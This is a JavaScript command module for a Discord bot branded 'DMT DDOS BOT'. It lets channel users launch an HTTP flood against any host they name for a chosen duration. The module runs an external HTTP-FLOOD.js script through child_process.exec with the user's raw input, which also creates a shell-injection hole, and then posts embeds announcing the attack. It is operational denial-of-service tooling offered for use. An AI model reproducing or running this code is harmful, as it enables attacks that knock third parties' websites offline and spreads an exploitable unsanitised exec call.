const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
    return;
  }

// Example command
if(!args[0]) {
    const embed1 = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle('WARRING')
    .setDescription("`Ex ;HTTP-NULL https://sex.com 60`")
    .setFooter("Please do not attack government website!")
    message.channel.send(embed1);
    return;
    }

// Command attack
var exec = require('child_process').exec
exec(`node HTTP-FLOOD.js ${host} ${duration}`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle('ð **DMT DDOS BOT** ð')
    .setTimestamp()
  .setDescription("**ððµðªð·**: `VIP ð` \n **ððð«ð ðð­** : `" + host + "` \n **ððð­ð¡ð¨ðð¬** : `ðððð-NULLð©` \n **ðððð** : `" + duration + "`")
    .setFooter('Â© Developer: #DagTriZaker', client.user.avatarURL)
    .setTimestamp()
    .setImage(attackgif)
    .setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://j.gifs.com/2kRnmP.gif", "https://media1.nguoiduatin.vn/thumb_x640x384/media/truong-cong-hieu/2019/06/15/bom-tsar-bomba.gif"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://cdn.weasyl.com/static/media/d5/a0/8f/d5a08f3f771a8c3efa3749cdfab5bda6853ba9f22dc5fe70f053595b6f480468.gif"];
        var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle('ð **DMT DDOS BOT** ð')
    .setTimestamp()
    .setDescription("**âº ððð¢ð­ ðð¨ð« ð­ð¡ð ðð¨ð¨ð¥ðð¨ð°ð§ ~~ **")
    .setFooter('Â© Developer: #DagTriZaker', client.user.avatarURL)
    .setTimestamp()
    .setImage(loadinggif)
    .setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTP-NULL'],
  permLevel: 0
}

exports.help = {
  name: 'HTTP-NULL',
  description: 'DagTriZaker',
  usage: 'HTTP-NULL'
}
